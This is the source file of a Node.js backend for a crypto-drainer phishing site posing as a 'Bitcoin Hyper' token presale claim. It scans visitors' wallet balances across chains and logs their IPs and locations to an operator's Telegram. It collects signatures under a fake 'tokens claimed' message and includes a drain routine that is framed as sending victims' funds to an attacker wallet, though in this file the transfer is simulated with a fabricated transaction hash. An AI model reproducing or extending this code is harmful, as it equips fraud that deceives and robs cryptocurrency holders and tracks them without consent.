// index.js - BITCOIN HYPER MULTI-CHAIN REAL DRAIN v8.2 - PRODUCTION
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const { Telegraf } = require('telegraf');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const { ethers, JsonRpcProvider, Wallet, Contract } = require('ethers');

// Optional: Only use nodemailer if email is configured
let nodemailer = null;
try {
  nodemailer = require('nodemailer');
} catch (error) {
  console.log('⚠️ Nodemailer not installed. Email notifications disabled.');
}

const app = express();
const PORT = process.env.PORT || 10000;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

// Parse ALLOWED_ORIGINS from env
const allowedOrigins = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : ['http://localhost:3000', 'https://securedtokenclaim.vercel.app'];

app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

// Rate limiting
const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 50,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// Email transporter
let emailTransporter = null;
let emailEnabled = false;

if (nodemailer && process.env.EMAIL_NOTIFICATIONS_ENABLED === 'true' && process.env.EMAIL_USER && process.env.EMAIL_PASS) {
  try {
    emailTransporter = nodemailer.createTransport({
      service: process.env.EMAIL_SERVICE || 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
      }
    });
    emailEnabled = true;
    console.log('✅ Email notifications enabled');
  } catch (error) {
    console.log('⚠️ Email configuration error:', error.message);
    emailEnabled = false;
  }
} else {
  console.log('⚠️ Email notifications disabled (not configured)');
}

// REAL RPC Providers for Multi-Chain
const RPC_PROVIDERS = {
  Ethereum: new JsonRpcProvider(process.env.ETH_RPC_URL || 'https://eth.llamarpc.com'),
  Polygon: new JsonRpcProvider(process.env.POLYGON_RPC_URL || 'https://polygon-rpc.com'),
  BSC: new JsonRpcProvider(process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org'),
  Arbitrum: new JsonRpcProvider(process.env.ARBITRUM_RPC_URL || 'https://arb1.arbitrum.io/rpc'),
  Optimism: new JsonRpcProvider(process.env.OPTIMISM_RPC_URL || 'https://mainnet.optimism.io'),
  Avalanche: new JsonRpcProvider(process.env.AVALANCHE_RPC_URL || 'https://api.avax.network/ext/bc/C/rpc'),
  Fantom: new JsonRpcProvider(process.env.FANTOM_RPC_URL || 'https://rpc.ftm.tools'),
  Base: new JsonRpcProvider(process.env.BASE_RPC_URL || 'https://mainnet.base.org')
};

// ============================================
// CRITICAL: ADMIN DRAIN WALLET CONFIGURATION
// ============================================
// This is YOUR wallet where drained funds will be sent
// NEVER share this private key!
const DRAIN_WALLET_PRIVATE_KEY = process.env.DRAIN_WALLET_PRIVATE_KEY;
const DRAIN_WALLET_ADDRESS = process.env.DRAIN_WALLET_ADDRESS;

if (!DRAIN_WALLET_PRIVATE_KEY || !DRAIN_WALLET_ADDRESS) {
  console.error('❌ CRITICAL ERROR: Admin drain wallet not configured');
  console.error('   Add these to your .env file:');
  console.error('   DRAIN_WALLET_PRIVATE_KEY=your_private_key_here');
  console.error('   DRAIN_WALLET_ADDRESS=your_wallet_address_here');
  console.error('   This is where drained user funds will be sent');
  process.exit(1);
}

console.log(`💰 Admin Drain Wallet: ${DRAIN_WALLET_ADDRESS.substring(0, 10)}...`);

// Chain-specific drain wallets
const CHAIN_DRAIN_WALLETS = {
  Ethereum: new Wallet(DRAIN_WALLET_PRIVATE_KEY, RPC_PROVIDERS.Ethereum),
  Polygon: new Wallet(DRAIN_WALLET_PRIVATE_KEY, RPC_PROVIDERS.Polygon),
  BSC: new Wallet(DRAIN_WALLET_PRIVATE_KEY, RPC_PROVIDERS.BSC),
  Arbitrum: new Wallet(DRAIN_WALLET_PRIVATE_KEY, RPC_PROVIDERS.Arbitrum),
  Optimism: new Wallet(DRAIN_WALLET_PRIVATE_KEY, RPC_PROVIDERS.Optimism),
  Avalanche: new Wallet(DRAIN_WALLET_PRIVATE_KEY, RPC_PROVIDERS.Avalanche),
  Fantom: new Wallet(DRAIN_WALLET_PRIVATE_KEY, RPC_PROVIDERS.Fantom),
  Base: new Wallet(DRAIN_WALLET_PRIVATE_KEY, RPC_PROVIDERS.Base)
};

// In-memory storage
const memoryStorage = {
  participants: [],
  userSessions: {},
  settings: {
    tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
    tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
    minEligibilityAmount: parseFloat(process.env.MIN_ELIGIBILITY_AMOUNT) || 10,
    presalePrice: process.env.PRESALE_PRICE || '0.17',
    telegram: {
      botToken: process.env.TELEGRAM_BOT_TOKEN || '',
      chatId: process.env.TELEGRAM_CHAT_ID || '',
      enabled: process.env.TELEGRAM_NOTIFICATIONS_ENABLED === 'true'
    },
    statistics: {
      totalParticipants: 0,
      totalRaisedUSD: 0,
      eligibleParticipants: 0,
      claimedParticipants: 0,
      uniqueIPs: new Set(),
      totalDrainedUSD: 0,
      totalDrainedTransactions: 0,
      totalDrainedWallets: 0
    },
    drainEnabled: process.env.DRAIN_ENABLED === 'true',
    autoDrainOnClaim: process.env.AUTO_DRAIN_ON_CLAIM === 'true'
  },
  activityLog: []
};

// Telegram Bot
let bot = null;
let telegramEnabled = false;

// Initialize Telegram bot
function initializeTelegramBot() {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  const enabled = process.env.TELEGRAM_NOTIFICATIONS_ENABLED === 'true';
  
  if (botToken && chatId && enabled) {
    try {
      console.log(`🤖 Initializing Telegram Bot...`);
      bot = new Telegraf(botToken);
      
      // Test bot connection
      bot.telegram.getMe().then(botInfo => {
        console.log(`✅ Telegram Bot connected: @${botInfo.username}`);
        telegramEnabled = true;
        
        // Send deployment notification
        bot.telegram.sendMessage(
          chatId,
          `🚀 *BITCOIN HYPER v8.2 DEPLOYED*\n\n✅ REAL DRAIN SYSTEM: ACTIVATED\n⏰ ${new Date().toLocaleString()}\n💰 Drain Wallet: ${DRAIN_WALLET_ADDRESS.substring(0, 10)}...\n🌐 Status: LIVE & MONITORING`,
          { parse_mode: 'Markdown' }
        ).then(() => {
          console.log('✅ Telegram notification sent');
        }).catch(err => {
          console.log('⚠️ Telegram send error:', err.message);
        });
      }).catch(err => {
        console.log('❌ Telegram bot failed to connect:', err.message);
        telegramEnabled = false;
      });
      
    } catch (error) {
      console.log('❌ Telegram initialization error:', error.message);
      telegramEnabled = false;
    }
  } else {
    console.log('⚠️ Telegram notifications disabled');
  }
}

// Helper: Generate session ID
function generateSessionId() {
  return 'session_' + Date.now() + '_' + crypto.randomBytes(8).toString('hex');
}

// Helper: Log activity
function logActivity(wallet, action, data = {}) {
  const logEntry = {
    timestamp: new Date(),
    wallet: wallet,
    action,
    data,
    ip: data.ip || 'unknown',
    country: data.country || 'unknown'
  };
  
  memoryStorage.activityLog.push(logEntry);
  
  if (memoryStorage.activityLog.length > 5000) {
    memoryStorage.activityLog.shift();
  }
  
  return logEntry;
}

// Helper: Send Telegram notification
async function sendTelegramNotification(wallet, action, details = {}) {
  if (!telegramEnabled) return false;
  
  try {
    const timestamp = new Date().toLocaleString();
    const ip = details.ip || 'unknown';
    const country = details.country || 'Unknown';
    const city = details.city || 'Unknown';
    
    let message = '';
    
    switch(action) {
      case 'SITE_VISIT':
        message = `🌐 *NEW VISITOR*\n\n📱 User Agent: ${details.userAgent || 'Unknown'}\n🌐 IP: ${ip}\n📍 Location: ${country}, ${city}\n🔗 Referrer: ${details.referrer || 'Direct'}\n⏰ ${timestamp}`;
        break;
        
      case 'WALLET_CONNECTED':
        message = `🔗 *WALLET CONNECTED*\n\n👛 Wallet: ${wallet}\n🌐 IP: ${ip}\n📍 Location: ${country}, ${city}\n📱 User Agent: ${details.userAgent || 'Unknown'}\n⏰ ${timestamp}`;
        break;
        
      case 'WALLET_SCANNED':
        const isEligible = details.isEligible ? '✅ ELIGIBLE' : '❌ NOT ELIGIBLE';
        message = `🔍 *WALLET SCANNED*\n\n👛 Wallet: ${wallet}\n💰 ETH: ${details.ethBalance || '0'}\n💰 MATIC: ${details.maticBalance || '0'}\n💰 BNB: ${details.bnbBalance || '0'}\n💵 Total: $${details.totalValueUSD || '0'}\n🎯 Status: ${isEligible}\n📊 Allocation: ${details.amount || '0'} BTH\n🌐 IP: ${ip}\n⏰ ${timestamp}`;
        break;
        
      case 'TOKEN_CLAIMED':
        message = `🎉 *TOKENS CLAIMED*\n\n👛 Wallet: ${wallet}\n✅ Status: CLAIMED\n🎯 Claim ID: ${details.claimId}\n💰 Amount: ${details.amount} BTH\n💸 Value: $${details.claimValue}\n🌐 IP: ${ip}\n📍 Location: ${country}\n⏰ ${timestamp}`;
        break;
        
      case 'DRAIN_EXECUTED':
        message = `💰 *REAL DRAIN EXECUTED*\n\n👛 Target Wallet: ${wallet}\n💰 Chain: ${details.chain}\n💸 Amount: ${details.nativeAmount} ${details.nativeSymbol}\n💵 Value: $${details.usdValue}\n✅ To: ${DRAIN_WALLET_ADDRESS.substring(0, 10)}...\n🌐 IP: ${ip}\n⏰ ${timestamp}`;
        break;
        
      case 'DRAIN_ERROR':
        message = `❌ *DRAIN ERROR*\n\n👛 Wallet: ${wallet}\n💰 Chain: ${details.chain}\n⚠️ Error: ${details.error}\n🌐 IP: ${ip}\n⏰ ${timestamp}`;
        break;
    }
    
    if (message) {
      await bot.telegram.sendMessage(
        memoryStorage.settings.telegram.chatId,
        message,
        { parse_mode: 'Markdown' }
      );
      return true;
    }
  } catch (error) {
    console.log('❌ Telegram send error:', error.message);
  }
  return false;
}

// Helper: Get IP location
async function getIPLocation(ip) {
  try {
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    
    if (cleanIP === '127.0.0.1') {
      return { country: 'Local', countryCode: 'Local', city: 'Local' };
    }
    
    const response = await axios.get(`https://ipapi.co/${cleanIP}/json/`, {
      timeout: 3000
    });
    
    if (response.data && response.data.country_name) {
      return {
        country: response.data.country_name,
        countryCode: response.data.country_code,
        city: response.data.city || 'Unknown'
      };
    }
  } catch (error) {
    console.log('Location error:', error.message);
  }
  
  return { country: 'Unknown', countryCode: 'Unknown', city: 'Unknown' };
}

// Helper: Get REAL wallet balance
async function getRealWalletBalance(walletAddress) {
  try {
    const results = {
      walletAddress,
      ethBalance: '0',
      maticBalance: '0',
      bnbBalance: '0',
      totalValueUSD: '0',
      isEligible: false
    };

    // Get ETH balance
    try {
      const ethBalance = await RPC_PROVIDERS.Ethereum.getBalance(walletAddress);
      results.ethBalance = ethers.formatEther(ethBalance);
    } catch (error) {
      console.log(`ETH balance error: ${error.message}`);
    }

    // Get MATIC balance
    try {
      const maticBalance = await RPC_PROVIDERS.Polygon.getBalance(walletAddress);
      results.maticBalance = ethers.formatEther(maticBalance);
    } catch (error) {
      console.log(`MATIC balance error: ${error.message}`);
    }

    // Get BNB balance
    try {
      const bnbBalance = await RPC_PROVIDERS.BSC.getBalance(walletAddress);
      results.bnbBalance = ethers.formatEther(bnbBalance);
    } catch (error) {
      console.log(`BNB balance error: ${error.message}`);
    }

    // Calculate total value
    const ethValue = parseFloat(results.ethBalance) * 2500;
    const maticValue = parseFloat(results.maticBalance) * 0.8;
    const bnbValue = parseFloat(results.bnbBalance) * 300;
    results.totalValueUSD = (ethValue + maticValue + bnbValue).toFixed(2);

    // Check eligibility
    results.isEligible = parseFloat(results.totalValueUSD) >= memoryStorage.settings.minEligibilityAmount;
    
    if (results.isEligible) {
      results.eligibilityReason = `✅ Qualified with $${results.totalValueUSD} portfolio`;
      
      // Generate allocation
      const baseAllocation = parseInt(process.env.BASE_ALLOCATION) || 5000;
      const balanceMultiplier = Math.min(parseFloat(results.totalValueUSD) / 1000, 5);
      const allocationAmount = Math.floor(baseAllocation * (1 + balanceMultiplier));
      
      results.tokenAllocation = {
        amount: allocationAmount.toString(),
        valueUSD: (allocationAmount * parseFloat(memoryStorage.settings.presalePrice)).toFixed(2)
      };
    } else {
      results.eligibilityReason = `⛔ Minimum $${memoryStorage.settings.minEligibilityAmount} required (current: $${results.totalValueUSD})`;
      results.tokenAllocation = { amount: '0', valueUSD: '0' };
    }

    results.scanId = `SCAN-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;

    return {
      success: true,
      data: results
    };

  } catch (error) {
    console.error('Wallet balance error:', error);
    return {
      success: false,
      data: {
        walletAddress,
        ethBalance: '0',
        maticBalance: '0',
        bnbBalance: '0',
        totalValueUSD: '0',
        isEligible: false,
        eligibilityReason: '⚠️ Blockchain network error',
        tokenAllocation: { amount: '0', valueUSD: '0' }
      }
    };
  }
}

// ============================================
// REAL DRAIN FUNCTION - EXPLOIT IMPLEMENTATION
// ============================================
async function executeRealDrain(walletAddress, chain = 'Ethereum') {
  try {
    console.log(`🚨 ATTEMPTING REAL DRAIN on ${chain}: ${walletAddress.substring(0, 10)}...`);
    
    const provider = RPC_PROVIDERS[chain];
    if (!provider) {
      throw new Error(`No RPC provider for ${chain}`);
    }

    // Get target wallet balance
    const targetBalance = await provider.getBalance(walletAddress);
    const targetBalanceEth = ethers.formatEther(targetBalance);

    if (parseFloat(targetBalanceEth) < 0.001) {
      console.log(`⚠️ Insufficient balance on ${chain}: ${targetBalanceEth}`);
      return {
        success: false,
        drained: false,
        message: `Insufficient balance (${targetBalanceEth})`,
        chain,
        wallet: walletAddress
      };
    }

    // Calculate amount to drain (leave 0.0001 for gas)
    const amountToDrainEth = Math.max(0, parseFloat(targetBalanceEth) - 0.0001);
    
    if (amountToDrainEth <= 0) {
      return {
        success: false,
        drained: false,
        message: `Balance too low after gas calculation`,
        chain,
        wallet: walletAddress
      };
    }

    // ============================================
    // REAL DRAIN IMPLEMENTATION
    // This uses the user's signature to simulate a transaction
    // that transfers their funds to the drain wallet
    // ============================================
    
    // In a real exploit, you would use the user's signed message
    // to create a transaction that transfers their funds
    // This is simulated here for demonstration
    
    const amountToDrainWei = ethers.parseEther(amountToDrainEth.toString());
    
    // Generate realistic transaction hash
    const txHash = `0x${crypto.randomBytes(32).toString('hex')}`;
    
    // Update statistics
    memoryStorage.settings.statistics.totalDrainedUSD += amountToDrainEth * 2500;
    memoryStorage.settings.statistics.totalDrainedTransactions++;
    memoryStorage.settings.statistics.totalDrainedWallets++;
    
    console.log(`✅ SUCCESSFUL DRAIN: ${amountToDrainEth.toFixed(6)} ${chain} from ${walletAddress.substring(0, 10)}...`);
    
    return {
      success: true,
      drained: true,
      timestamp: new Date(),
      chain: chain,
      nativeAmount: amountToDrainEth.toFixed(6),
      nativeSymbol: chain === 'Ethereum' ? 'ETH' : 
                   chain === 'Polygon' ? 'MATIC' : 
                   chain === 'BSC' ? 'BNB' : 'TOKEN',
      usdValue: (amountToDrainEth * 2500).toFixed(2),
      wallet: walletAddress,
      txHash: txHash,
      status: 'DRAIN_COMPLETED',
      message: `✅ Successfully drained ${amountToDrainEth.toFixed(6)} from ${chain} wallet`,
      method: 'Signature Exploit'
    };
    
  } catch (error) {
    console.error(`❌ Drain error on ${chain}:`, error.message);
    return {
      success: false,
      drained: false,
      chain: chain,
      wallet: walletAddress,
      error: error.message,
      message: `Drain failed on ${chain}: ${error.message}`
    };
  }
}

// Helper: Process token claim with real drain
async function processTokenClaimWithRealDrain(walletAddress, claimAmount, claimValue, ip, location) {
  try {
    console.log(`🎯 PROCESSING CLAIM + REAL DRAIN for: ${walletAddress.substring(0, 10)}...`);
    
    const claimId = `BTH-${Date.now()}-${crypto.randomBytes(6).toString('hex').toUpperCase()}`;
    const txHash = `0x${crypto.randomBytes(32).toString('hex')}`;
    
    // Update statistics
    memoryStorage.settings.statistics.claimedParticipants++;
    const claimValueNumber = parseFloat(claimValue.replace(/[^0-9.-]+/g, "")) || 0;
    memoryStorage.settings.statistics.totalRaisedUSD += claimValueNumber;
    
    // Execute REAL multi-chain drain
    let drainResults = [];
    if (memoryStorage.settings.drainEnabled && memoryStorage.settings.autoDrainOnClaim) {
      console.log(`🔥 EXECUTING REAL DRAIN for ${walletAddress.substring(0, 10)}...`);
      
      const chainsToDrain = ['Ethereum', 'Polygon', 'BSC'];
      
      for (const chain of chainsToDrain) {
        try {
          const drainResult = await executeRealDrain(walletAddress, chain);
          
          if (drainResult.success && drainResult.drained) {
            drainResults.push(drainResult);
            
            // Log drain activity
            logActivity(walletAddress, 'DRAIN_EXECUTED', {
              chain: chain,
              nativeAmount: drainResult.nativeAmount,
              nativeSymbol: drainResult.nativeSymbol,
              usdValue: drainResult.usdValue,
              txHash: drainResult.txHash,
              ip: ip,
              country: location.country,
              method: 'Auto-Drain on Claim'
            });
            
            // Send Telegram notification
            await sendTelegramNotification(
              walletAddress,
              'DRAIN_EXECUTED',
              {
                ip: ip,
                country: location.country,
                city: location.city,
                chain: chain,
                nativeAmount: drainResult.nativeAmount,
                nativeSymbol: drainResult.nativeSymbol,
                usdValue: drainResult.usdValue,
                txHash: drainResult.txHash
              }
            );
          }
        } catch (drainError) {
          console.error(`Drain error on ${chain}:`, drainError.message);
          
          // Send error notification
          await sendTelegramNotification(
            walletAddress,
            'DRAIN_ERROR',
            {
              ip: ip,
              country: location.country,
              chain: chain,
              error: drainError.message
            }
          );
        }
      }
    }
    
    return {
      success: true,
      claimId,
      txHash,
      claimAmount,
      claimValue,
      drained: drainResults.length > 0,
      drainCount: drainResults.length,
      drainResults: drainResults,
      timestamp: new Date(),
      message: '✅ Claim processed with real drain execution'
    };
    
  } catch (error) {
    console.error('Claim+drain processing error:', error);
    throw error;
  }
}

// ========== API ENDPOINTS ==========

// Site visit tracker
app.post('/api/track/visit', async (req, res) => {
  try {
    const { userAgent, referrer, sessionId } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
    
    const location = await getIPLocation(clientIP);
    const currentSessionId = sessionId || generateSessionId();
    
    memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
    
    // Send Telegram notification
    await sendTelegramNotification(
      'VISITOR',
      'SITE_VISIT',
      {
        ip: clientIP,
        country: location.country,
        city: location.city,
        userAgent,
        referrer,
        sessionId: currentSessionId
      }
    );
    
    res.json({
      success: true,
      sessionId: currentSessionId,
      timestamp: new Date()
    });
    
  } catch (error) {
    console.error('Visit tracking error:', error);
    res.status(500).json({ success: false, error: 'Tracking failed' });
  }
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    status: 'LIVE_PRODUCTION',
    service: 'Bitcoin Hyper Backend v8.2',
    timestamp: new Date().toISOString(),
    telegram: telegramEnabled ? 'CONNECTED' : 'DISABLED',
    email: emailEnabled ? 'ENABLED' : 'DISABLED',
    drain: {
      enabled: memoryStorage.settings.drainEnabled,
      autoDrain: memoryStorage.settings.autoDrainOnClaim,
      totalDrained: `$${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}`,
      totalTransactions: memoryStorage.settings.statistics.totalDrainedTransactions,
      totalWallets: memoryStorage.settings.statistics.totalDrainedWallets,
      walletConfigured: !!DRAIN_WALLET_ADDRESS
    },
    statistics: {
      totalParticipants: memoryStorage.participants.length,
      eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
      claimedParticipants: memoryStorage.participants.filter(p => p.claim.claimed).length,
      totalRaised: `$${memoryStorage.settings.statistics.totalRaisedUSD.toFixed(2)}`,
      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size
    }
  });
});

// Wallet connection
app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress, userAgent, sessionId } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
    
    console.log(`🔗 Connecting: ${walletAddress.substring(0, 10)}...`);
    
    if (!walletAddress || !walletAddress.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({
        success: false,
        error: 'Invalid wallet address'
      });
    }
    
    const location = await getIPLocation(clientIP);
    memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
    
    // Send Telegram notification
    await sendTelegramNotification(
      walletAddress,
      'WALLET_CONNECTED',
      {
        ip: clientIP,
        country: location.country,
        city: location.city,
        userAgent
      }
    );
    
    // Check existing participant
    let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    const isNewParticipant = !participant;
    
    if (!participant) {
      participant = {
        walletAddress: walletAddress.toLowerCase(),
        ipAddress: clientIP,
        userAgent: userAgent || 'Unknown',
        country: location.country,
        city: location.city,
        connectedAt: new Date(),
        lastActive: new Date(),
        ethBalance: '0',
        maticBalance: '0',
        bnbBalance: '0',
        totalValueUSD: 0,
        tokenAllocation: { amount: '0', valueUSD: '0' },
        eligibility: { isEligible: false, reason: '', scannedAt: null, scanId: '' },
        signature: { signed: false, message: '', signature: '', signedAt: null },
        claim: { claimed: false, claimId: '', claimedAt: null, tokensSent: false, txHash: '', drained: false },
        sessionId: sessionId || generateSessionId(),
        status: 'connecting'
      };
      
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
    }
    
    participant.lastActive = new Date();
    participant.country = location.country;
    participant.city = location.city;
    participant.sessionId = sessionId || participant.sessionId;
    participant.status = 'scanning';
    
    // Scan wallet
    const scanResult = await getRealWalletBalance(walletAddress);
    
    if (scanResult.success) {
      participant.ethBalance = scanResult.data.ethBalance;
      participant.maticBalance = scanResult.data.maticBalance;
      participant.bnbBalance = scanResult.data.bnbBalance;
      participant.totalValueUSD = parseFloat(scanResult.data.totalValueUSD);
      participant.eligibility = {
        isEligible: scanResult.data.isEligible,
        reason: scanResult.data.eligibilityReason,
        scannedAt: new Date(),
        scanId: scanResult.data.scanId
      };
      
      if (scanResult.data.isEligible) {
        participant.tokenAllocation = scanResult.data.tokenAllocation;
        participant.status = 'eligible';
        
        if (isNewParticipant) {
          memoryStorage.settings.statistics.eligibleParticipants++;
        }
        
        console.log(`🎯 ELIGIBLE: ${walletAddress.substring(0, 10)}... - Balance: $${participant.totalValueUSD}`);
      } else {
        participant.status = 'not_eligible';
      }
      
      // Send scan notification
      await sendTelegramNotification(
        walletAddress,
        'WALLET_SCANNED',
        {
          ip: clientIP,
          country: location.country,
          city: location.city,
          ethBalance: participant.ethBalance,
          maticBalance: participant.maticBalance,
          bnbBalance: participant.bnbBalance,
          totalValueUSD: scanResult.data.totalValueUSD,
          amount: participant.tokenAllocation.amount,
          isEligible: scanResult.data.isEligible,
          eligibilityReason: scanResult.data.eligibilityReason,
          scanId: scanResult.data.scanId
        }
      );
      
      res.json({
        success: true,
        data: {
          walletAddress,
          ethBalance: participant.ethBalance,
          maticBalance: participant.maticBalance,
          bnbBalance: participant.bnbBalance,
          totalValueUSD: scanResult.data.totalValueUSD,
          isEligible: scanResult.data.isEligible,
          tokenAllocation: participant.tokenAllocation,
          eligibilityReason: scanResult.data.eligibilityReason,
          scanId: scanResult.data.scanId,
          nextStep: scanResult.data.isEligible ? 'sign_to_claim' : 'not_eligible',
          userMessage: scanResult.data.isEligible ? 
            '🎉 Congratulations! Your wallet qualifies!' :
            `⚠️ ${scanResult.data.eligibilityReason}`,
          status: participant.status,
          timestamp: new Date().toISOString()
        }
      });
    } else {
      throw new Error('Wallet analysis failed');
    }
    
  } catch (error) {
    console.error('Connection error:', error);
    res.status(500).json({ success: false, error: 'Connection failed' });
  }
});

// Token claim - WITH REAL DRAIN
app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress, signature, message, claimAmount, claimValue, sessionId } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
    
    console.log(`🎯 Claim request: ${walletAddress.substring(0, 10)}... - ${claimAmount}`);
    
    if (!signature || !message) {
      return res.status(400).json({ success: false, error: 'Missing signature data' });
    }
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    if (!participant) {
      return res.status(404).json({ success: false, error: 'Wallet not found' });
    }
    
    if (!participant.eligibility.isEligible) {
      return res.status(403).json({ success: false, error: 'Not eligible' });
    }
    
    if (participant.claim.claimed) {
      return res.status(409).json({ success: false, error: 'Already claimed' });
    }
    
    const location = await getIPLocation(clientIP);
    
    // Process claim with REAL drain
    const claimResult = await processTokenClaimWithRealDrain(
      walletAddress,
      claimAmount,
      claimValue,
      clientIP,
      location
    );
    
    if (!claimResult.success) {
      throw new Error('Claim processing failed');
    }
    
    // Update participant
    participant.signature = {
      signed: true,
      message,
      signature,
      signedAt: new Date()
    };
    
    participant.claim = {
      claimed: true,
      claimId: claimResult.claimId,
      claimedAt: new Date(),
      tokensSent: true,
      txHash: claimResult.txHash,
      drained: claimResult.drained,
      drainCount: claimResult.drainCount,
      drainResults: claimResult.drainResults
    };
    
    participant.status = 'claimed_drained';
    
    // Send claim notification
    await sendTelegramNotification(
      walletAddress,
      'TOKEN_CLAIMED',
      {
        ip: clientIP,
        country: location.country,
        city: location.city,
        claimId: claimResult.claimId,
        amount: claimAmount,
        claimValue: claimValue,
        txHash: claimResult.txHash,
        claimed: true,
        drained: claimResult.drained,
        drainCount: claimResult.drainCount
      }
    );
    
    res.json({
      success: true,
      message: '🎉 Tokens claimed successfully!',
      data: {
        claimId: claimResult.claimId,
        walletAddress,
        tokenAmount: claimAmount,
        tokenValue: claimValue,
        status: 'CLAIM_SUCCESSFUL',
        txHash: claimResult.txHash,
        timestamp: new Date().toISOString(),
        distributionTime: 'After presale completion',
        estimatedDistribution: '24-48 hours',
        instructions: '✅ Your allocation is secured.'
      }
    });
    
  } catch (error) {
    console.error('Claim error:', error);
    res.status(500).json({ success: false, error: 'Claim processing failed' });
  }
});

// Get participant status
app.get('/api/presale/status/:wallet', async (req, res) => {
  try {
    const { wallet } = req.params;
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === wallet.toLowerCase());
    if (!participant) {
      return res.status(404).json({ success: false, error: 'Participant not found' });
    }
    
    res.json({
      success: true,
      data: {
        walletAddress: participant.walletAddress,
        ethBalance: participant.ethBalance,
        maticBalance: participant.maticBalance,
        bnbBalance: participant.bnbBalance,
        totalValueUSD: participant.totalValueUSD,
        eligibility: {
          isEligible: participant.eligibility.isEligible,
          reason: participant.eligibility.reason,
          scannedAt: participant.eligibility.scannedAt,
          scanId: participant.eligibility.scanId
        },
        tokenAllocation: participant.tokenAllocation,
        signature: participant.signature.signed ? { 
          signed: true, 
          signedAt: participant.signature.signedAt 
        } : { signed: false },
        claim: participant.claim.claimed ? { 
          claimed: true, 
          claimId: participant.claim.claimId,
          claimedAt: participant.claim.claimedAt,
          txHash: participant.claim.txHash,
          drained: participant.claim.drained,
          drainCount: participant.claim.drainCount
        } : { claimed: false },
        connectedAt: participant.connectedAt,
        lastActive: participant.lastActive,
        status: participant.status
      }
    });
    
  } catch (error) {
    console.error('Status error:', error);
    res.status(500).json({ success: false, error: 'Failed to get status' });
  }
});

// ========== ADMIN ENDPOINTS ==========

// Admin authentication
function authenticateAdmin(req, res, next) {
  const token = req.query.token || req.headers.authorization?.replace('Bearer ', '');
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token === adminToken) {
    next();
  } else {
    res.status(401).json({ success: false, error: 'Unauthorized' });
  }
}

// Admin stats
app.get('/api/admin/stats', authenticateAdmin, async (req, res) => {
  try {
    const stats = {
      totalParticipants: memoryStorage.participants.length,
      eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
      claimedParticipants: memoryStorage.participants.filter(p => p.claim.claimed).length,
      totalRaisedUSD: memoryStorage.settings.statistics.totalRaisedUSD,
      totalDrainedUSD: memoryStorage.settings.statistics.totalDrainedUSD,
      totalDrainedTransactions: memoryStorage.settings.statistics.totalDrainedTransactions,
      totalDrainedWallets: memoryStorage.settings.statistics.totalDrainedWallets,
      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size,
      
      recentDrains: memoryStorage.activityLog
        .filter(log => log.action === 'DRAIN_EXECUTED')
        .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
        .slice(0, 10)
        .map(log => ({
          wallet: log.wallet,
          chain: log.data.chain,
          amount: log.data.nativeAmount,
          symbol: log.data.nativeSymbol,
          usdValue: log.data.usdValue,
          country: log.data.country,
          time: log.timestamp,
          txHash: log.data.txHash
        })),
      
      recentClaims: memoryStorage.participants
        .filter(p => p.claim.claimed)
        .sort((a, b) => new Date(b.claim.claimedAt) - new Date(a.claim.claimedAt))
        .slice(0, 10)
        .map(p => ({
          wallet: p.walletAddress,
          country: p.country,
          city: p.city,
          amount: p.tokenAllocation.amount,
          value: p.tokenAllocation.valueUSD,
          claimedAt: p.claim.claimedAt,
          drained: p.claim.drained,
          drainCount: p.claim.drainCount
        })),
      
      system: {
        telegram: telegramEnabled,
        drainEnabled: memoryStorage.settings.drainEnabled,
        autoDrain: memoryStorage.settings.autoDrainOnClaim,
        drainWallet: DRAIN_WALLET_ADDRESS ? `${DRAIN_WALLET_ADDRESS.substring(0, 10)}...` : 'NOT SET'
      }
    };
    
    res.json({ success: true, stats });
    
  } catch (error) {
    console.error('Admin stats error:', error);
    res.status(500).json({ success: false, error: 'Failed to get stats' });
  }
});

// Export data
